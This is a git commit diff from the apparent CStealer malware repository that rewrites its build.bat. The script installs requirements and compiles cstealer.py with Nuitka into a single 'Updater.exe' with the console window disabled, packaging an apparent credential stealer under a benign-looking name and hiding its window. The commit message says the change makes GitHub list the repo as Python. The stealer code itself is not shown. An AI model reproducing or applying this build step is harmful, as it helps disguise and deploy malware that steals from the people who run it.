562a2e8fb97dfa1344f05fb4838226d1be23644e
86FX <126899456+86FX@users.noreply.github.com>
2025-01-31 18:20:05 +0300

    Minify so GitHub shows repo as Python

--- build.bat
+++ build.bat
@@ -1,6 +1,4 @@
-@echo off
-title github.com/86FX/CStealer
-cd %~dp0 &:: Enter current directory
-python -m pip install -U -r requirements.txt  &:: Install requirements
-python -m nuitka --onefile --assume-yes-for-downloads --plugin-enable=multiprocessing --windows-disable-console --output-file="Updater.exe" --python-flag=no_docstrings cstealer.py &:: Build
-pause
+@cd %~dp0
+@python -m pip install -U -r requirements.txt
+@python -m nuitka --onefile --assume-yes-for-downloads --plugin-enable=multiprocessing --windows-disable-console --output-file=Updater.exe cstealer.py
+@pause
